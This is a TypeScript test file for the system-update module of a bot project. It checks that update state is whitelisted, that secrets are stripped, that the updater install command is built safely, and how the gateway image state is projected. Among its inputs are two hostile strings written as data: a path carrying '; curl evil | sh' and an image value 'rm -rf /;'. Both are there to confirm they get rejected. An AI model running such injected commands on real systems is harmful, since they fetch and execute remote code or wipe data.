import { expect, test } from "bun:test";
import { estimateText, installUpdaterCommand, isNewerBuild, projectMagpieGatewayState, projectSystemUpdateState, safeText } from "./system-update";

const running = { version: "0.1.2", buildId: "glass-20261012a", commit: "a".repeat(40) };
const NOW = Date.parse("2026-10-12T02:00:00Z");

test("isNewerBuild only when both sides have a real, different build id", () => {
  expect(isNewerBuild("glass-a", { version: "1", buildId: "glass-b" })).toBe(true);
  expect(isNewerBuild("glass-a", { version: "1", buildId: "glass-a" })).toBe(false);
  expect(isNewerBuild("dev", { version: "1", buildId: "glass-b" })).toBe(false);
  expect(isNewerBuild("glass-a", { version: "1", buildId: "dev" })).toBe(false);
  expect(isNewerBuild(undefined, { version: "1", buildId: "x" })).toBe(false);
  expect(isNewerBuild("glass-a", null)).toBe(false);
});

test("projection keeps only whitelisted, well-formed fields", () => {
  const state = projectSystemUpdateState(
    {
      updatedAt: "2026-10-12T01:59:30Z",
      current: { image: "local/chisabot:glass-20261012a", commit: "a".repeat(40), secret: "x" },
      previous: { image: "local/chisabot:glass-20261011d" },
      source: { kind: "mirror", repo: "ChisaAlter/ChisaBot", branch: "main", token: "ghp_secret" },
      latest: { sha: "b".repeat(40), subject: "feat: 在线更新", author: "Hark", date: "2026-10-12T01:00:00Z" },
      behind: 2,
      commits: [
        { sha: "b".repeat(40), subject: "feat: 在线更新" },
        { sha: "not-a-sha", subject: "bad" },
        { sha: "c".repeat(40), subject: "x\u001b[31m red\u0007" },
      ],
      depsChanged: false,
      job: { id: "update-abc123", action: "update", status: "running", step: "frontend", log: ["a", 5, "b"], env: { TOKEN: "x" } },
      history: [{ id: "update-old111", action: "rollback", status: "rejected", at: "2026-10-11T00:00:00Z", error: "没有上一版" }, { bogus: 1 }],
    },
    running,
    ["check"],
    NOW,
  );
  expect(state.updaterOnline).toBe(true);
  expect(state.current).toEqual({ image: "local/chisabot:glass-20261012a", commit: "a".repeat(40) });
  expect(state.previous).toEqual({ image: "local/chisabot:glass-20261011d" });
  expect(JSON.stringify(state)).not.toContain("ghp_secret");
  expect(JSON.stringify(state)).not.toContain("TOKEN");
  expect(state.commits.map((c) => c.sha[0])).toEqual(["b", "c"]);
  expect(state.commits[1]?.subject).toBe("x[31m red");
  expect(state.job?.log).toEqual(["a", "b"]);
  expect(state.job?.step).toBe("frontend");
  expect(state.history).toHaveLength(1);
  expect(state.pending).toEqual(["check"]);
  expect(state.behind).toBe(2);
});

test("a stale state file means the updater is offline; garbage means nothing", () => {
  expect(projectSystemUpdateState({ updatedAt: "2026-10-12T01:50:00Z" }, running, [], NOW).updaterOnline).toBe(false);
  const empty = projectSystemUpdateState("nope", running, [], NOW);
  expect(empty.updaterOnline).toBe(false);
  expect(empty.behind).toBeNull();
  expect(empty.job).toBeNull();
  expect(projectSystemUpdateState({ behind: -1 }, running, [], NOW).behind).toBeNull();
  expect(projectSystemUpdateState({ current: { image: "rm -rf /;" } }, running, [], NOW).current).toBeUndefined();
});

test("safeText strips control characters and bounds length", () => {
  expect(safeText("a\u0000b\u001fc")).toBe("abc");
  expect(safeText("x".repeat(30), 10)).toBe("x".repeat(10));
  expect(safeText("x".repeat(500), 10)).toBeUndefined();
  expect(safeText(42)).toBeUndefined();
  expect(safeText("   ")).toBeUndefined();
});

test("full-build fields: mode, duration, estimates, reason, external run", () => {
  const state = projectSystemUpdateState(
    {
      updatedAt: "2026-10-12T01:59:00Z",
      depsChanged: true,
      fullReason: "这些提交改动了依赖",
      estimates: { code: 120, full: 540, bogus: 3, other: "x" },
      externalBusy: true,
      job: { id: "update-full01", action: "update", status: "running", mode: "full", durationSec: 30, step: "build", log: [] },
      history: [
        { id: "update-full00", action: "update", status: "succeeded", at: "2026-10-12T01:00:00Z", mode: "full", durationSec: 540 },
        { id: "update-code00", action: "update", status: "succeeded", at: "2026-10-12T00:00:00Z", mode: "weird", durationSec: -1 },
      ],
    },
    running,
    [],
    Date.parse("2026-10-12T02:00:00Z"),
  );
  expect(state.fullReason).toBe("这些提交改动了依赖");
  expect(state.estimates).toEqual({ code: 120, full: 540 });
  expect(state.externalBusy).toBe(true);
  expect(state.job).toMatchObject({ mode: "full", durationSec: 30, step: "build" });
  expect(state.history[0]).toMatchObject({ mode: "full", durationSec: 540 });
  expect(state.history[1]?.mode).toBeUndefined();
  expect(state.history[1]?.durationSec).toBeUndefined();
  expect(projectSystemUpdateState({ depsChanged: false, fullReason: "x" }, running, []).fullReason).toBeUndefined();
  expect(estimateText(540)).toBe("约 9 分钟");
  expect(estimateText(20)).toBe("约 1 分钟");
  expect(estimateText(undefined)).toBe("");
});

test("install command uses the deployment's checkout and refuses odd paths", () => {
  expect(installUpdaterCommand("/srv/chisabot")).toBe("cd /srv/chisabot && git pull && sudo sh deploy/install-updater.sh");
  expect(installUpdaterCommand()).toBe("cd /opt/chisabot-src && git pull && sudo sh deploy/install-updater.sh");
  expect(installUpdaterCommand("/x; curl evil | sh")).toBe("cd /opt/chisabot-src && git pull && sudo sh deploy/install-updater.sh");
});

test("updater version and warnings are projected; a state without a version is an old updater", () => {
  const base = { updatedAt: "Mon 2026-10-12 9:59 AM CST (UTC+08:00)" };
  expect(projectSystemUpdateState(base, running, [], NOW)).toMatchObject({ updaterOutdated: true, warnings: [] });
  // 4 是当前版本（加了 magpie 动作）；3 认不出那个动作，页面据此提示「先做一次系统更新」。
  expect(projectSystemUpdateState({ ...base, updaterVersion: "4", warnings: ["health_url_missing", 7] }, running, [], NOW)).toMatchObject({
    updaterVersion: 4,
    updaterOutdated: false,
    warnings: ["health_url_missing"],
  });
  expect(projectSystemUpdateState({ ...base, updaterVersion: "3" }, running, [], NOW).updaterOutdated).toBe(true);
  // Never wrote a state: not "outdated", just not installed.
  expect(projectSystemUpdateState(null, running, [], NOW).updaterOutdated).toBe(false);
});

test("magpie gateway state: digests decide, and a missing digest never claims an update", () => {
  const current = `sha256:${"a".repeat(64)}`;
  const latest = `sha256:${"b".repeat(64)}`;
  // 没有文件 / 不是对象：不显示这张卡。
  expect(projectMagpieGatewayState(null)).toBeUndefined();
  expect(projectMagpieGatewayState("nope")).toBeUndefined();

  expect(
    projectMagpieGatewayState({
      installed: true,
      image: "ghcr.io/yetone/magpie:latest",
      container: "magpie",
      currentDigest: current,
      latestDigest: latest,
      updateAvailable: true,
      checkedAt: "2026-10-19T07:00:00Z",
    }),
  ).toEqual({
    installed: true,
    image: "ghcr.io/yetone/magpie:latest",
    container: "magpie",
    currentDigest: current,
    latestDigest: latest,
    updateAvailable: true,
    checkedAt: "2026-10-19T07:00:00Z",
  });

  // 摘要一样就是没有新版，哪怕宿主机写错了。
  expect(
    projectMagpieGatewayState({ installed: true, currentDigest: current, latestDigest: current, updateAvailable: true })?.updateAvailable,
  ).toBe(false);
  // 拿不到远端摘要时不能说「有新版本」。
  expect(projectMagpieGatewayState({ installed: true, currentDigest: current, updateAvailable: true })?.updateAvailable).toBe(false);
  // 不是 sha256 的摘要、不认识的字段：丢掉。
  expect(projectMagpieGatewayState({ installed: false, currentDigest: "not-a-digest", latestDigest: 5, whatever: 1 })).toEqual({
    installed: false,
    updateAvailable: false,
  });
  // 查询失败的原因照原样给页面。
  expect(projectMagpieGatewayState({ installed: true, error: "registry 不可达" })?.error).toBe("registry 不可达");
});

test("magpie.json: 一键安装相关字段只认白名单值", () => {
  // 新 magpie.sh 写的：会装、是 ChisaBot 装的、校验过签名。
  expect(
    projectMagpieGatewayState({
      installed: true,
      installable: true,
      managed: true,
      verification: "attested",
    }),
  ).toEqual({
    installed: true,
    updateAvailable: false,
    installable: true,
    managed: true,
    verification: "attested",
  });
  // 旧 magpie.sh 不写 installable：页面据此提示先系统更新，不给按钮。
  expect(
    projectMagpieGatewayState({ installed: false })?.installable,
  ).toBeUndefined();
  // 不是 true 的值、不认识的校验方式：丢掉。
  expect(
    projectMagpieGatewayState({
      installed: false,
      installable: "yes",
      managed: 1,
      verification: "trust-me",
    }),
  ).toEqual({ installed: false, updateAvailable: false });
  for (const verification of ["attested", "digest", "off"] as const)
    expect(
      projectMagpieGatewayState({ installed: true, verification })
        ?.verification,
    ).toBe(verification);
});
